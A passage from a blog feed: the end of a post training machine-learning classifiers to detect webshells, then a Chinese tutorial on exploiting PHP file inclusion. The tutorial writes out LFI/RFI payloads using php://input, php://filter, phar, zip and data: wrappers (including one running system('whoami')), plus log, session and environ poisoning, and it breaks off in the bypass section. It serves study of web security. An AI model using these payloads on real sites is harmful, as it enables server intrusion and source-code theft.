href="#分类算法尝试" class="headerlink" title="分类算法尝试"></a>分类算法尝试</h3><h4 id="K近邻法"><a href="#K近邻法" class="headerlink" title="K近邻法"></a>K近邻法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import neighbors</span><br><span class="line"></span><br><span class="line">knc &#x3D; neighbors.KNeighborsClassifier()</span><br><span class="line">K_model &#x3D;knc.fit(x_train, y_train)</span><br><span class="line">y_pred &#x3D; K_model.predict(x_test)</span><br><span class="line"></span><br><span class="line">score(&quot;k近邻&quot;, y_test, y_pred)</span><br><span class="line">k近邻:</span><br><span class="line">精度：0.8494983277591973</span><br><span class="line">召回率：0.6397984886649875</span><br><span class="line">综合得分：0.7298850574712645</span><br></pre></td></tr></table></figure><h4 id="支持向量机"><a href="#支持向量机" class="headerlink" title="支持向量机"></a>支持向量机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import svm</span><br><span class="line"></span><br><span class="line">svc &#x3D; svm.SVC()</span><br><span class="line">S_model &#x3D;svc.fit(x_train, y_train)</span><br><span class="line">y_pred &#x3D; S_model.predict(x_test)</span><br><span class="line"></span><br><span class="line">score(&quot;支持向量机&quot;, y_test, y_pred)</span><br><span class="line">&#x2F;home&#x2F;cances&#x2F;.local&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;sklearn&#x2F;svm&#x2F;base.py:196: FutureWarning: The default value of gamma will change from &#39;auto&#39; to &#39;scale&#39; in version 0.22 to account better for unscaled features. Set gamma explicitly to &#39;auto&#39; or &#39;scale&#39; to avoid this warning.</span><br><span class="line">  &quot;avoid this warning.&quot;, FutureWarning)</span><br><span class="line">支持向量机:</span><br><span class="line">精度：0.9824561403508771</span><br><span class="line">召回率：0.28211586901763225</span><br><span class="line">综合得分：0.4383561643835617</span><br></pre></td></tr></table></figure><h4 id="决策树-1"><a href="#决策树-1" class="headerlink" title="决策树"></a>决策树</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import tree</span><br><span class="line"></span><br><span class="line">dtc &#x3D; tree.DecisionTreeClassifier()</span><br><span class="line">D_model &#x3D; dtc.fit(x_train, y_train)</span><br><span class="line">y_pred &#x3D; D_model.predict(x_test)</span><br><span class="line"></span><br><span class="line">score(&quot;决策树&quot;, y_test, y_pred)</span><br><span class="line">决策树:</span><br><span class="line">精度：0.9149484536082474</span><br><span class="line">召回率：0.8942065491183879</span><br><span class="line">综合得分：0.9044585987261146</span><br></pre></td></tr></table></figure><h4 id="朴素贝叶斯分类"><a href="#朴素贝叶斯分类" class="headerlink" title="朴素贝叶斯分类"></a>朴素贝叶斯分类</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from sklearn.naive_bayes import GaussianNB</span><br><span class="line"></span><br><span class="line">Bayes &#x3D; GaussianNB()        #高斯朴素贝叶斯</span><br><span class="line">B_model &#x3D; Bayes.fit(x_train, y_train)</span><br><span class="line">y_pred &#x3D; B_model.predict(x_test)</span><br><span class="line"></span><br><span class="line">score(&quot;贝叶斯分类器&quot;, y_test, y_pred)</span><br><span class="line">贝叶斯分类器:</span><br><span class="line">精度：0.9148936170212766</span><br><span class="line">召回率：0.4332493702770781</span><br><span class="line">综合得分：0.5880341880341879</span><br></pre></td></tr></table></figure><h4 id="随机森林-1"><a href="#随机森林-1" class="headerlink" title="随机森林"></a>随机森林</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from sklearn.ensemble import RandomForestClassifier</span><br><span class="line"></span><br><span class="line">forest_reg &#x3D; RandomForestClassifier(n_estimators&#x3D;15, random_state&#x3D;42, max_features&#x3D;3)</span><br><span class="line">forest_reg.fit(x_train, y_train)</span><br><span class="line">y_pred &#x3D; forest_reg.predict(x_test)</span><br><span class="line"></span><br><span class="line">score(&quot;随机森林&quot;, y_test, y_pred)</span><br><span class="line">随机森林:</span><br><span class="line">精度：0.9625668449197861</span><br><span class="line">召回率：0.906801007556675</span><br><span class="line">综合得分：0.933852140077821</span><br></pre></td></tr></table></figure><h4 id="ADABOOST"><a href="#ADABOOST" class="headerlink" title="ADABOOST"></a>ADABOOST</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from sklearn.ensemble import AdaBoostClassifier</span><br><span class="line"></span><br><span class="line">ada &#x3D; AdaBoostClassifier(n_estimators&#x3D;100,algorithm&#x3D;&#39;SAMME.R&#39;)</span><br><span class="line">A_model &#x3D;ada.fit(x_train, y_train)</span><br><span class="line">y_pred &#x3D; A_model.predict(x_test)</span><br><span class="line"></span><br><span class="line">score(&quot;AdaBoost&quot;, y_test, y_pred)</span><br><span class="line">AdaBoost:</span><br><span class="line">精度：0.9105691056910569</span><br><span class="line">召回率：0.8463476070528967</span><br><span class="line">综合得分：0.877284595300261</span><br></pre></td></tr></table></figure><h4 id="XGBOOST"><a href="#XGBOOST" class="headerlink" title="XGBOOST"></a>XGBOOST</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import xgboost as xgb</span><br><span class="line"></span><br><span class="line">params &#x3D; &#123;</span><br><span class="line">    &#39;booster&#39;: &#39;gbtree&#39;,</span><br><span class="line">    &#39;num_class&#39;: 2,               ## 类别数，与 multisoftmax 并用</span><br><span class="line">    &#39;gamma&#39;: 0.1,                  ## 用于控制是否后剪枝的参数,越大越保守，一般0.1、0.2这样子。</span><br><span class="line">    &#39;max_depth&#39;: 12,               ## 构建树的深度，越大越容易过拟合</span><br><span class="line">    &#39;lambda&#39;: 2,                   ## 控制模型复杂度的权重值的L2正则化项参数，参数越大，模型越不容易过拟合。</span><br><span class="line">    &#39;subsample&#39;: 0.7,              ## 随机采样训练样本</span><br><span class="line">    &#39;colsample_bytree&#39;: 0.7,       ## 生成树时进行的列采样</span><br><span class="line">    &#39;min_child_weight&#39;: 3,</span><br><span class="line">    &#39;silent&#39;: 1,                   ## 设置成1则没有运行信息输出，最好是设置为0.</span><br><span class="line">    &#39;eta&#39;: 0.007,</span><br><span class="line">    &#39;seed&#39;: 1000,</span><br><span class="line">    &#39;nthread&#39;: 4,</span><br><span class="line">&#125;</span><br><span class="line">params[&#39;eval_metric&#39;] &#x3D; &#39;error&#39;</span><br><span class="line">num_round &#x3D; 200</span><br><span class="line">dtest &#x3D; xgb.DMatrix( x_test, label&#x3D;y_test)</span><br><span class="line">dtrain &#x3D; xgb.DMatrix( x_train, label&#x3D;y_train)</span><br><span class="line">evallist  &#x3D; [(dtest,&#39;test&#39;), (dtrain,&#39;train&#39;)]</span><br><span class="line">xgbo &#x3D; xgb.XGBClassifier(max_depth&#x3D;3, n_estimators&#x3D;10000, learn_rate&#x3D;0.01)</span><br><span class="line">xgbo.fit(x_train, y_train)</span><br><span class="line">y_pred &#x3D; xgbo.predict(x_test)</span><br><span class="line"></span><br><span class="line">score(&quot;xgboost&quot;, y_test, y_pred)</span><br><span class="line">&#x2F;home&#x2F;cances&#x2F;.local&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;xgboost&#x2F;core.py:587: FutureWarning: Series.base is deprecated and will be removed in a future version</span><br><span class="line">  if getattr(data, &#39;base&#39;, None) is not None and \</span><br><span class="line">&#x2F;home&#x2F;cances&#x2F;.local&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;xgboost&#x2F;core.py:588: FutureWarning: Series.base is deprecated and will be removed in a future version</span><br><span class="line">  data.base is not None and isinstance(data, np.ndarray) \</span><br><span class="line">xgboost:</span><br><span class="line">精度：0.9545454545454546</span><br><span class="line">召回率：0.8992443324937027</span><br><span class="line">综合得分：0.9260700389105059</span><br></pre></td></tr></table></figure><h4 id="GBDT-LR"><a href="#GBDT-LR" class="headerlink" title="GBDT+LR"></a>GBDT+LR</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from sklearn.ensemble import GradientBoostingClassifier</span><br><span class="line"></span><br><span class="line">gbm1 &#x3D; GradientBoostingClassifier(n_estimators&#x3D;50, random_state&#x3D;10, subsample&#x3D;0.6, max_depth&#x3D;7,</span><br><span class="line">                                  min_samples_split&#x3D;900)</span><br><span class="line">G_model &#x3D;gbm1.fit(x_train, y_train)</span><br><span class="line">y_pred &#x3D; G_model.predict(x_test)</span><br><span class="line"></span><br><span class="line">score(&quot;GBDT &quot;, y_test, y_pred)</span><br><span class="line">GBDT :</span><br><span class="line">精度：0.9351351351351351</span><br><span class="line">召回率：0.871536523929471</span><br><span class="line">综合得分：0.9022164276401564</span><br></pre></td></tr></table></figure><h4 id="投票算法"><a href="#投票算法" class="headerlink" title="投票算法"></a>投票算法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from sklearn.ensemble import VotingClassifier</span><br><span class="line"></span><br><span class="line">vot &#x3D; VotingClassifier(</span><br><span class="line">    estimators &#x3D; [(&#39;F&#39;, forest_reg), (&#39;X&#39;, xgbo)],</span><br><span class="line">    voting &#x3D; &#39;soft&#39;</span><br><span class="line">)</span><br><span class="line">v_model &#x3D; vot.fit(x_train, y_train)</span><br><span class="line">y_pred &#x3D; v_model.predict(x_test)</span><br><span class="line"></span><br><span class="line">score(&quot;Voting&quot;, y_test, y_pred)</span><br><span class="line">Voting:</span><br><span class="line">精度：0.9624664879356568</span><br><span class="line">召回率：0.9042821158690176</span><br><span class="line">综合得分：0.9324675324675323</span><br></pre></td></tr></table></figure><h3 id="对随机森林进行参数优化测试"><a href="#对随机森林进行参数优化测试" class="headerlink" title="对随机森林进行参数优化测试"></a>对随机森林进行参数优化测试</h3><h4 id="Estimators参数调整"><a href="#Estimators参数调整" class="headerlink" title="Estimators参数调整"></a>Estimators参数调整</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">A_score &#x3D; []</span><br><span class="line">R_score &#x3D; []</span><br><span class="line">F_score &#x3D; []</span><br><span class="line"></span><br><span class="line">for i in range(1, 30):</span><br><span class="line">    forest_reg &#x3D; RandomForestClassifier(n_estimators&#x3D;i, random_state&#x3D;42, max_features&#x3D;2)</span><br><span class="line">    forest_reg.fit(x_train, y_train)</span><br><span class="line">    y_pred &#x3D; forest_reg.predict(x_test)</span><br><span class="line">    A_score.append(precision_score(y_test, y_pred))</span><br><span class="line">    R_score.append(recall_score(y_test, y_pred))</span><br><span class="line">    F_score.append(f1_score(y_test, y_pred))</span><br><span class="line">plt.plot(range(1,30), A_score, c&#x3D;&#39;r&#39;)</span><br><span class="line">plt.plot(range(1,30), R_score, c&#x3D; &#39;g&#39;)</span><br><span class="line">plt.plot(range(1,30), F_score, ls&#x3D;&#39;--&#39;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&lt;matplotlib.lines.Line2D at 0x7fb149b3c898&gt;]</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c9b431d6d021167de267d698ce119e55cf4a50.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c9b431d6d021167de267d698ce119e55cf4a50.png" srcset="data:image/png;base64,666" alt="png"></p><h4 id="features参数调整"><a href="#features参数调整" class="headerlink" title="features参数调整"></a>features参数调整</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">A_score &#x3D; []</span><br><span class="line">R_score &#x3D; []</span><br><span class="line">F_score &#x3D; []</span><br><span class="line"></span><br><span class="line">for i in range(1, 5):</span><br><span class="line">    forest_reg &#x3D; RandomForestClassifier(n_estimators&#x3D;11, random_state&#x3D;42, max_features&#x3D;i)</span><br><span class="line">    forest_reg.fit(x_train, y_train)</span><br><span class="line">    y_pred &#x3D; forest_reg.predict(x_test)</span><br><span class="line">    A_score.append(precision_score(y_test, y_pred))</span><br><span class="line">    R_score.append(recall_score(y_test, y_pred))</span><br><span class="line">    F_score.append(f1_score(y_test, y_pred))</span><br><span class="line">plt.plot(range(1, 5), A_score, c&#x3D;&#39;r&#39;)</span><br><span class="line">plt.plot(range(1, 5), R_score, c&#x3D; &#39;g&#39;)</span><br><span class="line">plt.plot(range(1, 5), F_score, ls&#x3D;&#39;--&#39;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&lt;matplotlib.lines.Line2D at 0x7fb149b13470&gt;]</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/4dfb47d0297ba9e041d02c340c3e498f69ca26.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/4dfb47d0297ba9e041d02c340c3e498f69ca26.png" srcset="data:image/png;base64,666" alt="png"></p><h3 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h3><h4 id="确定最终模型并将训练结果存储起来"><a href="#确定最终模型并将训练结果存储起来" class="headerlink" title="确定最终模型并将训练结果存储起来"></a>确定最终模型并将训练结果存储起来</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from sklearn.externals import joblib</span><br><span class="line"></span><br><span class="line">forest_reg &#x3D; RandomForestClassifier(n_estimators&#x3D;11, random_state&#x3D;42, max_features&#x3D;2)</span><br><span class="line">last_model &#x3D; forest_reg.fit(x_train, y_train)</span><br><span class="line">joblib.dump(last_model, &quot;model.pkl&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#39;model.pkl&#39;]</span><br></pre></td></tr></table></figure><h4 id="读取模型的方法"><a href="#读取模型的方法" class="headerlink" title="读取模型的方法"></a>读取模型的方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from sklearn.externals import joblib</span><br><span class="line"></span><br><span class="line">joblib.load(&quot;model.pkl&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RandomForestClassifier(bootstrap&#x3D;True, class_weight&#x3D;None, criterion&#x3D;&#39;gini&#39;,</span><br><span class="line">            max_depth&#x3D;None, max_features&#x3D;2, max_leaf_nodes&#x3D;None,</span><br><span class="line">            min_impurity_decrease&#x3D;0.0, min_impurity_split&#x3D;None,</span><br><span class="line">            min_samples_leaf&#x3D;1, min_samples_split&#x3D;2,</span><br><span class="line">            min_weight_fraction_leaf&#x3D;0.0, n_estimators&#x3D;11, n_jobs&#x3D;None,</span><br><span class="line">            oob_score&#x3D;False, random_state&#x3D;42, verbose&#x3D;0, warm_start&#x3D;False)</span><br></pre></td></tr></table></figure><p>最后还有一个验证集部分，因为代码写的比较乱就不放上来了，结果还不错，大部分马都没能逃过模型的“法眼”。除了网站安装文件被误报其他的没有毛病了。安装文件本来也就有很大的权限，而且正常运营的网站也不应该存在安装文件，防止被重置网站，这样我的模型还有了一个可以检测安装文件是否被删除的附加功能，很满意。。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;当时为了完成毕设写的一个小东西，留作纪念。大佬们看了轻喷&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;学习网络安安全有段时间了，对Web安全已经建立了一个系统的认识。而且自己一直对人工智能、机器学习这类东西蛮感兴趣的，而且一直在看《Hands On </summary>
      
    
    
    
    <category term="编程" scheme="https://canc3s.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="python" scheme="https://canc3s.github.io/tags/python/"/>
    
    <category term="机器学习" scheme="https://canc3s.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="webshell" scheme="https://canc3s.github.io/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>php文件包含</title>
    <link href="https://canc3s.github.io/2019/02/10/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>https://canc3s.github.io/2019/02/10/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2019-02-10T15:30:04.000Z</published>
    <updated>2021-01-30T10:23:24.336Z</updated>
    
    <content type="html"><![CDATA[<h1 id="本地文件包含的利用思路"><a href="#本地文件包含的利用思路" class="headerlink" title="本地文件包含的利用思路"></a>本地文件包含的利用思路</h1><ol><li>通过日志写入任意代码进行包含攻击</li><li>利用上传点，上传正常文件包含webshell脚本</li><li>LFI With PHPInfo Assistance</li><li>包含session(默认php安装配置，获取sesion文件名)</li></ol><h1 id="php文件包含"><a href="#php文件包含" class="headerlink" title="php文件包含"></a>php文件包含</h1><p>php的文件包含函数：</p><ol><li>include()</li><li>include_once()</li><li>require()</li><li>require_once()</li></ol><blockquote><p>reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。</p></blockquote><blockquote><p>include() 如果出错的话，只会提出警告，会继续执行后续语句。</p></blockquote><p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。</p><p>可能存在文件包含漏洞的必要条件：</p><ol><li>具有文件包含函数。</li><li>文件包含函数中存在动态变量。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br></pre></td></tr></table></figure><ol start="3"><li>攻击者能够控制该变量。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br></pre></td></tr></table></figure><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><h2 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h2><p>本地文件包含漏洞，是指能打开并包含本地文件的漏洞。</p><h2 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h2><p>远程文件包含漏洞。是指能够远程包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害和很大。</p><p>但RFI的利用条件较为苛刻，需要php.ini中进行配置：</p><blockquote><p>allow_url_fopen = On<br>allow_url_include = On</p></blockquote><p>两个配置选项均需要为On，才能远程包含文件成功。</p><blockquote><p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认Off。</p></blockquote><h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>利用条件：</p><ol><li>allow_url_include = On。</li><li>对allow_url_fopen不做要求。</li></ol><p>利用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>利用条件：</p><p>无</p><p>利用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?</span><br><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure><p>^</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?</span><br><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure><blockquote><p>可以直接读取经过base64加密后的文件源码。</p></blockquote><h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p><p>php版本大于等于5.3.0</p><p>利用方法：</p><p>将php文件打包成zip压缩包，然后</p><p>指定绝对路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file+phar:&#x2F;&#x2F;D:&#x2F;phpStudy&#x2F;WWW&#x2F;test.zip&#x2F;test.php</span><br></pre></td></tr></table></figure><p>或者相对路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;phar:&#x2F;&#x2F;test.zip&#x2F;test.php</span><br></pre></td></tr></table></figure><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p><p>php版本大于等于5.3.0</p><p>利用方法：</p><p>构造zip包</p><p>然后指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;zip:&#x2F;&#x2F;D:\phpStudy\WWW\test.zip%23test.php</span><br></pre></td></tr></table></figure><blockquote><p>使用相对路径会包含失败。</p></blockquote><h3 id="data-URI-schema"><a href="#data-URI-schema" class="headerlink" title="data:URI schema"></a>data:URI schema</h3><p>利用条件：</p><ol><li>php版本大于等于php5.2.0</li><li>allow_url_fopen = On</li><li>allow_url_include = On</li></ol><p>利用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;whoami&#39;);?&gt;</span><br></pre></td></tr></table></figure><p>^</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;data:text;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><p>加号+的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8%2b</code>的base64解码为：<code>&lt;?php phpinfo();?&gt;</code>。</p><h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p>利用条件：</p><ol><li>session文件路径已知</li><li>session文件内容可控</li></ol><blockquote><p>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p></blockquote><p>常见的php-session存放位置：</p><ol><li>/var/lib/php/sess_PHPSESSID</li><li>/var/lib/php/sess_PHPSESSID</li><li>/tmp/sess_PHPSESSID</li><li>/tmp/sessions/sess_PHPSESSID</li></ol><p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。</p><h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><h4 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h4><p>利用条件：</p><ol><li>服务器日志文件路径已知</li><li>服务器日志文件可读</li></ol><p>利用方式：</p><p>使用burp截包后修改。</p><blockquote><p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p></blockquote><h4 id="ssh日志"><a href="#ssh日志" class="headerlink" title="ssh日志"></a>ssh日志</h4><p>利用条件：</p><ol><li>ssh日志位置已知</li><li>ssh日志可读</li></ol><blockquote><p>日志位置默认情况下为 /var/log/auth.log</p></blockquote><p>利用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ ssh &#39;&lt;?php phpinfo(); ?&gt;&#39;@remotehost</span><br></pre></td></tr></table></figure><h4 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a>包含environ</h4><p>利用条件：</p><ol><li>php以cgi方式运行，这样environ才会保存UA头。</li><li>environ文件存储位置已知，且environ文件可读。</li></ol><p>利用方式：</p><p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p><h4 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h4><p>利用条件：</p><ol><li>文件上传路径</li><li>文件名</li></ol><p>利用方式：</p><p>文件上传</p><h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><h2 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h2><p>服务器代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;/var/www/html/&#x27;</span>.<span class="variable">$file</span>;</span><br><span class="line"><span 